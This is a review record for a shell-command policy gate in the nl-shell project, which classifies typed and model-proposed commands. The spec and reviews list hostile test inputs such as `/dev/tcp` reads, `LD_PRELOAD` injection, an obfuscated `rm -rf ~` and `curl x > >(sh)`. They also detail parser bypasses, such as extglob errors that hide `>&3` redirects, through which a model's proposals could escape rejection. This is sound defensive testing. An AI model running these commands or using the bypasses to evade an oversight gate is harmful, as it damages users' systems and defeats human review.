# Result — issue 196 / ast-policy-gate-shell-layer

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: 
- Success criterion: `tests/test_policy_gate.py` passes, covering:
  - `policy-gate/v1` §1.1 characters: row 30 (`ls ‮txt.exe`, U+202E in a proposal) is
    rejected; the same text typed is at least `mutating`, reason "hidden character".
    A proposal holding a lone surrogate (`ls \udcff`) is rejected.
  - §1.2 unparseable: row 31 (`if true; then`) is `mutating`, reason contains
    "unparseable".
  - §1.7 model label: a proposal labelled `destructive` for `true` is `destructive`;
    a label never lowers the class: `true` labelled `read-only` stays `mutating`. Both
    are also run with `gate.rules` monkeypatched to return `read-only` for `true`, so
    the label is checked against a class below it (labelled `destructive` ⇒
    `destructive`; labelled `read-only` ⇒ the §7 stub's `mutating`).
  - Shell-level §2: row 7 (`PAGER=sh git log`) and row 13 (`LD_PRELOAD=./x.so ls`) give a
    prefix-assignment reason; row 15 (`ls > ~/.bashrc`) an output-redirect reason, while
    `>/dev/null`, `2>&1`, `1>&2`, `>&2` add none; row 14 (`cat </dev/tcp/example.org/80`)
    a `/dev/tcp` reason; row 16 (`$'\x72m' -rf ~`) and `$(echo rm) -rf ~` a non-literal
    command word reason; `diff <(ls) <(ls)` a process-substitution reason;
    `LESSOPEN='|sh %s' less f` a prefix-assignment reason. A command word that is a path
    outside the system directories (`/tmp/rm x`, `./rm x`) gets a path reason;
    `/usr/bin/rm x` and `//usr/bin/rm x` (leading slashes collapsed, as Linux resolves
    them — v1 regression) do not.
  - §1.2 also: `case x in` is unparseable (it parses to an `ERROR` node; `if true; then`
    to `MISSING "fi"`).
  - Shell-level §3: a function definition is `session-altering`. The whole §3 name list
    (`docs/design/specs/policy-gate/v1.md:104-107`, including the `LD_*`, `GIT_*`,
    `SUDO_*`, `PYTHON*`, `PERL5*` patterns and `PS0`–`PS4`) is this child's, matched on
    every `variable_assignment` node, standalone or inside a `declaration_command`.
    Cases: standalone `PATH=x`, `IFS=x`, `LD_PRELOAD=x`, `LD_LIBRARY_PATH=x`, `GIT_DIR=x`,
    `GIT_PAGER=x`, `PS1=x`, `PYTHONPATH=x`, `NODE_OPTIONS=x` and `export PATH=./bin`
    (spec row 5's setup) are `session-altering` with a reason naming the variable. Forms
    with no plain `variable_assignment` node (`export "PATH"=x`, `read`, `printf -v`, …)
    are #197's.
  - Shell-level §5: row 25 (`echo hi >&3`) and `3>x`, `{fd}>x`, `exec 3>&-`, `>&$x`,
    `<&$fd`, `>&"$X"`, `2>&${FD}`, and a 40-digit fd number (`echo x >&4444…`) are
    rejected (a descriptor the gate cannot prove is below 3 is rejected); any
    `variable_assignment` node naming `SUDO_PROMPT` or `SUDO_ASKPASS` is rejected, reason
    containing "SUDO_" — standalone or as a prefix: row 23 (`SUDO_PROMPT=x sudo true`) and
    `SUDO_ASKPASS=/x sudo true`, and `export SUDO_PROMPT=x` (tree-sitter-bash puts a
    `variable_assignment` node inside the `declaration_command`).
  - Walk coverage: every simple command inside pipelines, lists, subshells, `if` /
    `while` / `for` / `case` bodies, function bodies and command substitutions reaches
    the command layer (asserted on the invocation records). `declaration_command`
    (`export`, `declare`, `typeset`, `local`, `readonly`) and `unset_command` nodes are
    handed to the command layer as invocations with their command word, like a `command`
    node, so child-2 can give them meaning. A test enumerates every named
    node kind from the pinned `tree_sitter.Language` and asserts each one has a handler.
  - Stdin context, v2 regression (v2's walker recorded the second stage of
    `cat <<E | X` as reading the terminal instead of the pipe, so the sudo pipe rule never
    fired): in `cat <<E | sudo tee /x` and `cat <<E | doas id`
    (here-doc body `x`), the second stage's invocation has stdin = pipe, not terminal;
    `cat <x | y` and `cat <<<x | y` agree with it. `bash <<<'rm -rf ~'` and a quoted
    here-doc record the literal text.
  - Decision C: a node kind with its handler removed (monkeypatched), a budget overrun
    (deep nesting, and a long chain of substitutions that stays under the depth limit),
    and an internal error each give `privileged`, rejected, reason "could not class".
    `classify` never raises.
  - The §7 stub proof: with `gate.rules` monkeypatched to return `read-only` for `ls`,
    `classify("ls")` is `mutating`, reason "live-session resolution not implemented"
    (this exact string is defined here, in `gate/live.py`; #198 and #192 assert on it).
    `gate.live` is called directly with a `read-only` input and returns `mutating` with
    that reason. Across all other cases, no result is `read-only`.
  - Vectors: the conformance-row cases of this test are read from
    `targets/ubuntu-26.04/gate-vectors.toml` through the new loader (not repeated inline).
    The loader rejects, with an error naming the entry, a missing `command` or `class`, a
    class outside the five, an unknown key, and invalid TOML. The file's header says it
    holds the rows landed so far and is complete (spec Conformance, `v1.md:245-249`)
    only when #192 lands.
  The gate's output has the session-log `gate` shape `{"class", "reasons", "rejected"}`
  (`docs/design/specs/session-log/v1.md`).
- Repo + branch target: eduralph/nl-shell @ main
- Scope (one logical fix) / out of scope: 

## 2. Disposition claimed               ← sign-off confirms or overrides
- Outcome: new-feature
- Confidence: medium
- Recommendation: (set by Do)

## 3. Correctness (Check — chain)
- C1 Spec: none — brief.md
- C2 Reproduction (red pre-fix): none — (no gate configured)
- C3 Change: none — patch.diff
- C4 fix verified: bundle test red pre-fix, green post-fix (pytest): pass — C4 PASS — red without the fix (217 of 217 failed), green with it
- C5 Causal adequacy: none — reviewer + human sign-off

## 4. Conformance (Check — stack)
- T1 Structure: none — (no gate configured)
- T2 security-relevant change also updates the threat model: pass — security-relevant paths touched and the threat model updated: src/nl_shell/gate/__init__.py src/nl_shell/gate/live.py sr
- T3 runtime: the whole nl-shell pytest suite on the patched worktree: pass — T3 PASS — nl-shell suite green
- T4 PR body has a user-impact opener + tracker id in both artifacts: deferred — pr-description.md not drafted yet — the substantive T4 audit of the contribution artifacts runs at publish
- T5 Judgment: none — reviewer + human sign-off
- T5 judgment: → see §5.

## 5. Advisory review (artifact-only, decorrelated)
Reviewer ran without build-notes.md. Summary:

Review the new fail-closed policy-gate shell layer, including grammar coverage, invocation records, stdin tracking, and bounded parsing.

| Item | Verdict | Basis |
|------|---------|-------|
| C1 Spec | PASS | The shell-layer scope and deliberately mutating command/live stubs are explicit; class-raising compatibility decisions still require human approval under docs/design/specs/policy-gate/v1.md:238. |
| C2 Reproduction (red pre-fix) | PASS | Frozen evidence shows all 217 cases fail with production changes reverted because the gate package is absent; gate-logs/C4-verify.log:17. This establishes the missing feature, not independent coverage of every shell semantic. |
| C3 Change | PASS | Changes stay within the planned parser, pipeline stubs, vectors, dependency pins, tests and threat-model update; src/nl_shell/gate/__init__.py:126 and pyproject.toml:19. |
| C4 Verification (red→green) | PASS | Captured real-parser run reports 217 green cases and 217 red failures, with no collection errors; gate-logs/C4-verify.log:15. Independent rerun unavailable: python is absent and python3 lacks tree_sitter; no local red→green is claimed. |
| C5 Causal adequacy | NEEDS-HUMAN [impl] | Correct fd-0 output-duplication/closure tracking before downstream rules trust stdin: _stdin_after leaves both >& and >&- unchanged, so 0>&1 and 0>&- retain terminal/pipe provenance incorrectly; src/nl_shell/gate/parse.py:1026. Add invocation-level regressions for these forms and redirect ordering. |
| T1 Structure | PASS | Parsing/context and command/live policy remain separate with one shared classification budget and explicit extension points; src/nl_shell/gate/__init__.py:126 and src/nl_shell/gate/parse.py:331. |
| T2 Shape | PASS | Threat-model touch is confirmed by the scanner log and source inspection; it documents parser limits, descriptor protections and unresolved dynamic-path limits; .oss-scanner/threat_model.md:114 and gate-logs/T2-threat-model.log:10. |
| T3 Runtime | PASS | Captured full-suite run reports 1318 passed, one skipped and a forkpty warning; gate-logs/T3-suite.log:36. Local runtime reproduction is unavailable without tree_sitter; the dependency was exercised by the captured gate. |
| T4 Contribution | N/A | Contribution artifacts are drafted after Check; the substantive audit reruns at publish, as recorded in gate-logs/T4-contribution.log:10. |
| T5 Judgment | NEEDS-HUMAN | Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection under docs/design/specs/policy-gate/v1.md:238; confirm licenses for the new pins at pyproject.toml:19. Confirm affected-path prior art across merged and closed/rejected work: this disposable target has only one synthetic base commit and no remotes, so its history cannot settle that check (brief.md:139). INTEGRATION.md §4 is not supplied, so additional enumerated human-only obligations cannot be checked here. |
| Validation — fitness-to-purpose | NEEDS-HUMAN | Decide whether this deliberately conservative, unwired shell layer is fit for the staged rollout, including rejected parser-mismatch syntax and deferred command/live semantics; src/nl_shell/gate/__init__.py:25 and .oss-scanner/threat_model.md:133. Green tests alone do not establish completeness against Bash. |

Independent investigation: extracted the actual `_stdin_after` and `_is_zero` function ASTs from target source and executed them with simple redirect records, without replacing their logic. For fd 0 starting at terminal, operators `>&`, `>&-`, `<&`, `<&-` returned respectively `terminal`, `terminal`, `descriptor`, `closed`. A real Bash `exec 0>&-` followed by checking `/proc/self/fd/0` reported `closed`. This isolates the missing output-operator branches; full classify/invocation regression remains for the builder because the parser dependency is unavailable locally.

All source citations refer to the supplied target tree. No capability-probe/load-time-side-effect symptom guard was found; parser-mismatch rejection protects unsupported syntax directly. Frozen wrappers are instance-scoped and were adjudicated from their complete logs. The target was not modified.

<!-- pdca:leaf-complete -->

### Advisory — adversary

# Adversarial review — issue_196, round 6

I re-ran the proof. I installed the pinned `tree-sitter==0.26.0` and
`tree-sitter-bash==0.25.1` into a local venv. `tests/test_policy_gate.py` gives 217
passed on the patched tree. The C4 red leg (`gate-logs/C4-verify.log`) fails for the
right reason, `ModuleNotFoundError: No module named 'nl_shell.gate'`, so the red→green
evidence holds. I also broke each round-6 fix in a scratch copy to check whether its
test goes red. Results are in the bullets.

- NEEDS-HUMAN [impl] — **An output process substitution's command is recorded as reading the terminal, but it reads a pipe.** This is the same kind of bug the round-5 ruling fixed for function bodies. `src/nl_shell/gate/parse.py:1225-1231` (`_substitution`) walks `<(…)` and `>(…)` with the caller's stdin unchanged. In bash, the command inside `>(cmd)` reads from the pipe the outer command writes to. I checked this in real bash: `printf 'from-pipe\n' > >(read l; echo "$l") </dev/null` prints `from-pipe`. Gate walk results: `curl x > >(sh)` records `sh` with `Stdin(source='terminal')`, and `cat <<E > >(sudo tee /x)` (body `x`) records `sudo` with `Stdin(source='terminal')`. These are the exact cases the pipe-into-sudo rule and decision B (#197) are meant to catch, and they escape the same way `curl evil | f` did before the round-5 fix. (`curl x | tee >(sh)` shows `pipe` only because it inherits `tee`'s stdin.) The class is `mutating` today only because of the process-substitution reason and the stub floor. Fix: in `_substitution`, when the node opens with `>(`, walk the children with `stdin=PIPE`. `<(…)` keeps the caller's stdin. Test: add `curl x > >(sh)` → `sh` stdin `pipe` and `cat <<E > >(sudo tee /x)` → `sudo` stdin `pipe` beside `test_stdin_of_every_stage` (`tests/test_policy_gate.py:~606`).

- NEEDS-HUMAN [impl] — **No test needs the new "reject every file redirect in an unreadable tree" rule.** The round-5 ruling asked for it, at `src/nl_shell/gate/parse.py:794-800`. I replaced the condition with `if False:` in a scratch copy and all 217 tests still passed. The three new reproducers (`tests/test_policy_gate.py:317-319`) are already rejected by `_extglob_inside` (`parse.py:480-492`). Removing *both* turns those three red, but removing this rule alone changes nothing the suite checks. Across about 45 probe inputs, the only results this rule changes are benign ones: `ls >/dev/null @(x)`, `ls *.@(c|h) 2>/dev/null` and `ls !(foo) 2>/dev/null` go from not rejected to rejected. So the rule has no test, and its only effect I can see is extra rejections. Fix: add a case that pins it, for example assert `ls !(foo) 2>/dev/null` is rejected with reason "a redirection in text the parser could not read". Otherwise a later refactor can drop the rule silently.

- NEEDS-HUMAN [human] — **The unreadable-tree rule rejects the user's own harmless extglob commands.** `parse.py:794-800` rejects outright: `classify("ls !(foo) 2>/dev/null", origin="typed")` and `classify("ls *.@(c|h) 2>/dev/null", origin="typed")` give `rejected=True` with only `2>/dev/null` as the redirect. tree-sitter-bash 0.25.1 cannot parse an extglob in an argument, so any typed extglob command with any redirect, even `2>/dev/null`, is refused. The human asked for this rule, so it follows the ruling as written. But the cost to typed use was likely not weighed. Should the rule apply only to proposals, or only to redirects whose own target or neighbouring bytes touch the ERROR node? That is a policy call.

- Non-literal descriptor paths are still not rejected: `echo hi >/dev/fd/$'3'` and `echo hi >/proc/$$/fd/3` give `mutating, rejected=False` (`parse.py:801-807` skips them because `target.value is None`). This is the `>$F` scope question the human parked. The threat model says so honestly (`.oss-scanner/threat_model.md:131-133`). `$'3'` is a constant the gate could decode, so it may be worth adding to that parked item. I am not counting this against this round.

What I tried to break and could not:
- Middle-of-word extglob targets. `>/dev/fd/3@()`, `3@(|)`, `!(x)3`, `3@(x)y`, `3@($(echo x))`, `> /dev/fd/3@(x)`, `3\@(x)`, `>&3@(x)` and the `[[ ]]`/`case` contexts are all rejected.
- Descriptor-path variants. `/dev/./fd/3`, `/dev/fd/0003`, `/proc/1234/fd/3`, `/proc/thread-self/fd/3`, `/proc/self/task/1/fd/3`, quoted and escaped parts are all rejected.
- Function bodies. `function f {…}`, `f() (…)`, `f() if …`, nested definitions, and a here-doc or `</dev/tty` on the definition all record `unknown`. A pipe inside the body still records `pipe`. Switching the body back to `TERMINAL` turns all three `test_function_body_stdin_is_unknown` cases red, so that test is a real one.
- The threat-model text (`threat_model.md:114-142`) matches what the code rejects for every probe above.
<!-- pdca:leaf-complete -->

### Advisory — security-review

# Security review (advisory) — ast-policy-gate-shell-layer, round 6

Attacker-reachable inputs this diff touches: the model's proposal (threat model "Where untrusted input enters" item 5) and typed text, both fed to `nl_shell.gate.classify` → `parse.walk`. The gate is not wired to the REPL yet (#78), and the command-layer stub makes every simple command at least `mutating`, so today nothing runs without a confirm.

What I checked: the two round-5 fixes. First, every `file_redirect` in an unparseable tree is now rejected (`src/nl_shell/gate/parse.py:794-800`), and `_extglob_inside` (`parse.py:480-492`) catches an extglob opener anywhere in the target. Second, function bodies are walked with `stdin=UNKNOWN` (`parse.py:1222`). The `Stdin` docstring (`parse.py:213-216`) says consumers must treat "unknown" as the worst case, and the threat-model text (`.oss-scanner/threat_model.md:131-136`) matches. I went through the cases `>/dev/fd/3@(x|)`, `>"/dev/fd/3"@(x)`, `>/dev/fd/3@()` (empty pattern), extglob after an expansion (handled through the raw-text fallback, so it fails closed), redirects on the function definition itself (`f() { …; } <x`, `>&3`: still walked and checked; the body stays "unknown", which is the worst case), and pipelines inside a function body (a later stage still gets "pipe"). I found no bypass in that code. The tests at `tests/test_policy_gate.py:317-319` and `:614-629` cover the attacker inputs the brief names, not only the friendly path.

tree-sitter is not installed in this sandbox, so I could not run any probe. The one finding below is from reading the code and is unconfirmed.

- NEEDS-HUMAN [human] — (toolchain unavailable; finding unconfirmed.) **The "every file redirection in unparseable text is rejected" rule only covers `file_redirect` nodes, not loose redirect tokens inside an `ERROR` node.** Nearest severity row: High, "printed text forges a control-channel record". Real impact today is low: a confirm is still required, the gate is not wired, and #135 already lists commands that write fd 3. Where: `src/nl_shell/gate/parse.py:794` runs only from `check_redirect`, which only runs for nodes that became `file_redirect`. `_error` (`parse.py:1048-1054`) fails closed on loose `<<` / `<<-` tokens inside an ERROR, which shows the builder already expects ERROR nodes to hold raw operator tokens. It does nothing for loose `>`, `>>`, `>&`, `<&`, `&>` or `<>` tokens. Input: the model's proposal. If tree-sitter-bash recovers from an error by leaving `>&` and `3` as bare children of the ERROR node, no `Redirect` is ever built. The command is then only `mutating` ("unparseable"), not rejected, while bash (which parses it fine) writes to fd 3. That conflicts with the new threat-model sentence at `.oss-scanner/threat_model.md:130-132`. Candidate probes, all valid in bash with extglob on, where the error point comes before the redirect: `echo @(x|) >&3`, `echo @(x|) >/dev/fd/3`, `echo @(x|) 3>x`. If any of them gives `rejected=False`, the fix is small and builder-sized: in `_error`, reject with `DESCRIPTOR_REASON` when any anonymous child is a redirect operator token (as is already done for `<<`), and add these probes to `test_descriptor_not_provably_below_three_is_rejected` (`tests/test_policy_gate.py:336`). A human needs to run the probes with the pinned grammar first. If they all come back `rejected=True`, drop this item.

Nothing else found in this round's diff.

<!-- pdca:leaf-complete -->

## 6. NEEDS-HUMAN — items the human must clear before sign-off
- [ ] C5 Causal adequacy — Correct fd-0 output-duplication/closure tracking before downstream rules trust stdin: _stdin_after leaves both >& and >&- unchanged, so 0>&1 and 0>&- retain terminal/pipe provenance incorrectly; src/nl_shell/gate/parse.py:1026. Add invocation-level regressions for these forms and redirect ordering.
- [ ] T5 Judgment — Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection under docs/design/specs/policy-gate/v1.md:238; confirm licenses for the new pins at pyproject.toml:19. Confirm affected-path prior art across merged and closed/rejected work: this disposable target has only one synthetic base commit and no remotes, so its history cannot settle that check (brief.md:139). INTEGRATION.md §4 is not supplied, so additional enumerated human-only obligations cannot be checked here.
- [ ] Validation — fitness-to-purpose — Decide whether this deliberately conservative, unwired shell layer is fit for the staged rollout, including rejected parser-mismatch syntax and deferred command/live semantics; src/nl_shell/gate/__init__.py:25 and .oss-scanner/threat_model.md:133. Green tests alone do not establish completeness against Bash.
- [ ] **An output process substitution's command is recorded as reading the terminal, but it reads a pipe.** This is the same kind of bug the round-5 ruling fixed for function bodies. `src/nl_shell/gate/parse.py:1225-1231` (`_substitution`) walks `<(…)` and `>(…)` with the caller's stdin unchanged. In bash, the command inside `>(cmd)` reads from the pipe the outer command writes to. I checked this in real bash: `printf 'from-pipe\n' > >(read l; echo "$l") </dev/null` prints `from-pipe`. Gate walk results: `curl x > >(sh)` records `sh` with `Stdin(source='terminal')`, and `cat <<E > >(sudo tee /x)` (body `x`) records `sudo` with `Stdin(source='terminal')`. These are the exact cases the pipe-into-sudo rule and decision B (#197) are meant to catch, and they escape the same way `curl evil | f` did before the round-5 fix. (`curl x | tee >(sh)` shows `pipe` only because it inherits `tee`'s stdin.) The class is `mutating` today only because of the process-substitution reason and the stub floor. Fix: in `_substitution`, when the node opens with `>(`, walk the children with `stdin=PIPE`. `<(…)` keeps the caller's stdin. Test: add `curl x > >(sh)` → `sh` stdin `pipe` and `cat <<E > >(sudo tee /x)` → `sudo` stdin `pipe` beside `test_stdin_of_every_stage` (`tests/test_policy_gate.py:~606`).
- [ ] **No test needs the new "reject every file redirect in an unreadable tree" rule.** The round-5 ruling asked for it, at `src/nl_shell/gate/parse.py:794-800`. I replaced the condition with `if False:` in a scratch copy and all 217 tests still passed. The three new reproducers (`tests/test_policy_gate.py:317-319`) are already rejected by `_extglob_inside` (`parse.py:480-492`). Removing *both* turns those three red, but removing this rule alone changes nothing the suite checks. Across about 45 probe inputs, the only results this rule changes are benign ones: `ls >/dev/null @(x)`, `ls *.@(c|h) 2>/dev/null` and `ls !(foo) 2>/dev/null` go from not rejected to rejected. So the rule has no test, and its only effect I can see is extra rejections. Fix: add a case that pins it, for example assert `ls !(foo) 2>/dev/null` is rejected with reason "a redirection in text the parser could not read". Otherwise a later refactor can drop the rule silently.
- [ ] **The unreadable-tree rule rejects the user's own harmless extglob commands.** `parse.py:794-800` rejects outright: `classify("ls !(foo) 2>/dev/null", origin="typed")` and `classify("ls *.@(c|h) 2>/dev/null", origin="typed")` give `rejected=True` with only `2>/dev/null` as the redirect. tree-sitter-bash 0.25.1 cannot parse an extglob in an argument, so any typed extglob command with any redirect, even `2>/dev/null`, is refused. The human asked for this rule, so it follows the ruling as written. But the cost to typed use was likely not weighed. Should the rule apply only to proposals, or only to redirects whose own target or neighbouring bytes touch the ERROR node? That is a policy call.
- [ ] (toolchain unavailable; finding unconfirmed.) **The "every file redirection in unparseable text is rejected" rule only covers `file_redirect` nodes, not loose redirect tokens inside an `ERROR` node.** Nearest severity row: High, "printed text forges a control-channel record". Real impact today is low: a confirm is still required, the gate is not wired, and #135 already lists commands that write fd 3. Where: `src/nl_shell/gate/parse.py:794` runs only from `check_redirect`, which only runs for nodes that became `file_redirect`. `_error` (`parse.py:1048-1054`) fails closed on loose `<<` / `<<-` tokens inside an ERROR, which shows the builder already expects ERROR nodes to hold raw operator tokens. It does nothing for loose `>`, `>>`, `>&`, `<&`, `&>` or `<>` tokens. Input: the model's proposal. If tree-sitter-bash recovers from an error by leaving `>&` and `3` as bare children of the ERROR node, no `Redirect` is ever built. The command is then only `mutating` ("unparseable"), not rejected, while bash (which parses it fine) writes to fd 3. That conflicts with the new threat-model sentence at `.oss-scanner/threat_model.md:130-132`. Candidate probes, all valid in bash with extglob on, where the error point comes before the redirect: `echo @(x|) >&3`, `echo @(x|) >/dev/fd/3`, `echo @(x|) 3>x`. If any of them gives `rejected=False`, the fix is small and builder-sized: in `_error`, reject with `DESCRIPTOR_REASON` when any anonymous child is a redirect operator token (as is already done for `<<`), and add these probes to `test_descriptor_not_provably_below_three_is_rejected` (`tests/test_policy_gate.py:336`). A human needs to run the probes with the pinned grammar first. If they all come back `rejected=True`, drop this item.
- [ ] **The tracker record is missing, so the problem statement and the "ignored context" check could not be done.** `notes.json` and `sources/` are not in the bundle I was given. Several parts of the brief rest only on that thread: "decision A's floor", "decision B (child-2)", "Decision C", "child-2" and "child-3", the sibling split (#190/#191/#192) and the "v2 regression". None of the decisions A/B/C appear anywhere in the target. A grep for `decision [ABC]` and `could not class` matches only `.github/triage/triage_priority.py:42,402`, which is unrelated. The human should confirm these decisions really are in the thread, or the brief should state them inline.
- [ ] **The "§7 stub proof" criterion cannot fail.** The brief ships `rules.py` as a stub where "every simple command is `mutating`, reason 'not allowlisted'". With that stub, nothing reaches `gate/live.py` as `read-only`. So "no case returns `read-only`" passes even if `live.py` is deleted or returns `read-only`. The same applies to "§1.7 … a label never lowers the class": every command is already at least `mutating`, so a label below that can never be observed lowering anything. The tests need to exercise `live.py` directly, for example by monkeypatching `rules` to return `read-only` and asserting that live turns it into `mutating` with "live-session resolution not implemented". The label test needs a matching fixture. Otherwise these two bullets pass whether or not the code works.
- [ ] **Decision C and the fd rule go beyond the spec. The brief calls them restorations; they are new rules.** `policy-gate/v1` has no internal-error or budget rule. Decision C ("`privileged`, rejected, reason 'could not class'") is new. The spec rejects only "file descriptor 3 or higher" (`docs/design/specs/policy-gate/v1.md:126`). The brief also rejects any descriptor the gate "cannot prove is below 3" (`>&$x`, `<&$fd`, `2>&${FD}`). Both are stricter, so they are probably compatible changes. But the spec's Versioning section (`v1.md:238-241`) says raising a class "MUST be reviewed by a human". The brief does not flag either one for sign-off, and does not plan a spec edit to record them.
- [ ] **The §3 variable rule is underspecified and only partly tested.** The success criterion tests standalone assignments to `PATH`, `IFS`, `LD_PRELOAD` and `GIT_DIR` only. Spec §3 (`v1.md:104-107`) lists about 20 names and patterns (`PS0`–`PS4`, `LD_*`, `GIT_*`, `SUDO_*`, `PYTHON*`, `PERL5*`, `NODE_OPTIONS`, …) and covers them "standalone **or exported**". The brief applies the `variable_assignment`-inside-`declaration_command` handling only to `SUDO_*`. It never says whether `export PATH=./bin` (the setup for spec row 5) gets `session-altering` from the shell layer, or ends up as just `mutating` from the stub, which loses the session-altering warning. The Scope section also never says whether the full §3 list is in this child or in child-2. Do will have to guess.
- [ ] **`gate-vectors.toml` and its loader are a hidden second change that no test checks.** Scope adds `targets/ubuntu-26.04/gate-vectors.toml` "with this child's rows and a vector loader in the style of `src/nl_shell/targets.py:145-247`". No success-criterion bullet says the tests read their cases from that file, or tests the loader (missing file, bad TOML, schema). That is new data, a new module and new review surface with no red→green test. The spec also says a target's vectors file "MUST cover every row" (`v1.md:245-249`), so a partial file under that name does not meet the spec. Either drop it, or add a criterion such as "the tests read every case from the file; the loader rejects malformed entries" and say how the file relates to the full-row requirement.
- [ ] **Two citations do not resolve in the target.** `engine/scripts/run-verify.sh:196` (Falsifiability) and `results/issue_189/iteration-v2/patch.diff` with `parse.py:397,411` (Prior-art) are not in `$PDCA_TARGET`. A glob of `engine/**` and `results/**` matches nothing. They probably live in the PDCA harness checkout. The rule that Do "must cite path:line on the target branch" can't be applied to them, and a Do agent grounded on the target can't open them. Prior-art also says the v2 here-doc handling "is the bug listed above", but the brief never states that bug. The only mention is the bullet header "Stdin context, v2 regression". One sentence describing the v2 defect (stdin of the second pipeline stage recorded as terminal after a here-doc) would close the gap.
- [ ] **The §1.1 check is stricter than the spec, and the brief doesn't say so.** The brief reuses `render.has_hidden` (`src/nl_shell/render.py:136`). That function ignores quoting and covers Cf/Co/Cn/default-ignorable/surrogates (`render.py:113-127`). The spec forbids the listed characters only "outside quotes" (`v1.md:59-61`). That is fine for safety, since it only raises the class or rejects. But it means a proposal like `echo '‮'` is rejected, which differs from the spec text. A sign-off note should record that this deviation is deliberate.
- [ ] **These pinned-version claims can't be checked from the target and are load-bearing.** "tree-sitter-bash 0.25.1 has 59" named node kinds, the compatibility of `tree-sitter==0.26.0` with `tree-sitter-bash==0.25.1`, and "`case x in` parses to an `ERROR` node; `if true; then` to `MISSING "fi"`" are all assertions about third-party wheels. Nothing in the repo backs them up (`pyproject.toml:13-17` has no tree-sitter today). If either pin is wrong, Do stalls on the first install. The success criterion already makes the node-kind test enumerate the kinds at run time, so the brief should drop the hard-coded "59" rather than imply a test depends on it. The pins should be confirmed with one `pip install` before Do starts. The licence question is already deferred to sign-off.
- [ ] size backstop — this slice is behaving oversized: patch is 110 KB (threshold 100 KB); 5 round(s) already spent (threshold 2). Recommend answering `iterate-plan` at sign-off and authoring the split in the re-plan (`pdca split`), rather than `iterate-do`: a slice that is too big yields implementation-shaped findings every round, and splitting authors briefs, which is Plan's beat.
- [ ] T5 Judgment — Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection, confirm parser dependency licensing, and settle affected-path prior art across merged and closed/rejected work — the disposable repository has only one base commit and no remotes, so complete history cannot be checked; target/docs/design/specs/policy-gate/v1.md:238, target/pyproject.toml:19, brief.md:127 and brief.md:139.
- [ ] **Assignments the parser does not give a `variable_assignment` node skip §3 and §5.** The brief limits the rule to `variable_assignment` nodes (`parse.py:701-711`). But the forms below are syntax the shell layer walks, not commands, so #197's command layer will never see them as invocations. `for` and `expansion` are plain pass-through containers (`parse.py:736-749`):
- [ ] **T2 is unverifiable: no threat-model update.** `gate-logs/T2-threat-model.log` shows the whole new gate package changed with no edit to `.oss-scanner/threat_model.md`. The brief cites that model's Critical row (`:296`) and High row (`:303`) as the invariant this work restores. A human should decide whether the model needs a new row now (the gate as a parse-differential surface: tree-sitter vs bash, see `cat <<E; rm x` below) or only when #78 wires the gate into the REPL.
- [ ] **No effect in this diff. It becomes High ("pipes into sudo" must be rejected, ADR-0015) once child-2's sudo-pipe rule reads `Invocation.stdin`.** At `src/nl_shell/gate/parse.py:714-719`, a function body is always walked with `stdin=TERMINAL`. But the body runs with the stdin of the call site. Input: the model's proposal. Example: `f() { sudo tee /x; }; cat <<E | f` (here-doc body `x`). The call `f` gets stdin = pipe, but the `sudo tee /x` invocation is recorded as reading the terminal. That is the same mistake the brief cites as v2's here-doc pipeline bug, moved into a function body. Calling `f` is opaque and the definition is `session-altering`, so the command is still confirmed. But a pipe-into-sudo *rejection* built on this field would not fire, and the sudo password could be fed from the pipe. The brief's `Stdin` sources (terminal / pipe / file / here-doc / here-string) have no "unknown" value for this case. Adding one, or making #197 treat function-body invocations as stdin-unknown, changes the contract the siblings depend on. That is a scope call for the human, not a builder iteration.
- [ ] T5 Judgment — Confirm dependency licensing and complete affected-path prior-art review across merged and closed/rejected work before sign-off — the brief flags the licensing decision, while this target has one synthetic base commit, no remotes and no gate-path history; closed-work evidence and INTEGRATION §4 are not supplied (brief.md:142, brief.md:145; target/pyproject.toml:20).
- [ ] **Scope of "cannot prove": non-literal redirect targets and unparseable text.** The new threat-model line (`threat_model.md:120-121`) promises rejection of any redirection the gate cannot prove uses only fds 0-2. The code keeps two cases at `mutating`, not rejected. (1) A non-literal output target, `echo x >"$f"` or `>/proc/$$/fd/3` (`parse.py:519-525`): its value is unknown, so it could be `/dev/fd/3`. (2) Text that parses with an `ERROR` node (`parse.py:788`, `__init__.py:124-125`): a `>&3` that tree-sitter folds into the `ERROR` node never becomes a `file_redirect`, so it gets only "unparseable" (`mutating`). Until #191 that is an accepted bypass class (`threat_model.md:227-228`). Both still need a confirm. Rejecting every non-literal output target is a large behaviour change, so a human should decide which way to go. Option one: narrow the threat-model wording to literal targets on a parseable tree. Option two: add backstops, such as rejecting non-literal output targets, and rejecting unparseable text whose bytes match `[<>]&|/dev/fd/|/proc/[^/]*/fd/`. I found no concrete grammar input for (2), and it is unconfirmed without the toolchain.

## 7. Proven / not proven
- Proven by which oracle: gates overall = pass (stub oracles).
- Unproven / needs manual run: anything flagged in §6.

## 8. Ready-to-ship attachments
- patch.diff
- tracker-comment.md     (ALWAYS, every tracker item)
- build-notes.md         (builder rationale — for the human, not the reviewer)

## 9. Check sign-off                     ← human completes Check here
- Disposition confirmed / overridden:
- Outcome: iterated-to-Plan
- Iteration delta (if iterating): Slice is oversized: 110 KB patch / 12 files, 5 rounds, and each review round finds new parser edge cases instead of converging. Split in Plan (`nl-shell-pdca split 196`), e.g. (1) core parser/walker + Decision C fail-closed fallback, (2) descriptor/redirect rules, (3) stdin provenance tracking. Carry forward as known gaps for the children: fd-0 output dup/close (`0>&1`, `0>&-`) not tracked; `>(cmd)` should give cmd stdin=pipe; the "reject every file redirect in an unparseable tree" rule has no test that pins it; that rule also rejects harmless typed extglob + `2>/dev/null` (policy call: proposals only, or only redirects touching the ERROR node?); loose redirect tokens inside ERROR nodes may escape rejection (unconfirmed, probe `echo @(x|) >&3` with pinned grammar). Many §6 items are stale from earlier rounds (T2 threat model, §7 stub proof, function-body stdin) — the re-plan should start from a fresh list.
- By / date: Eduard Ralph / 2026-10-23

## 10. Act candidates (hints for the next Act review)
- Plan advisory: 8 finding(s); brief revised: yes (plan-advisory-*.md)
- (empty is the common case)
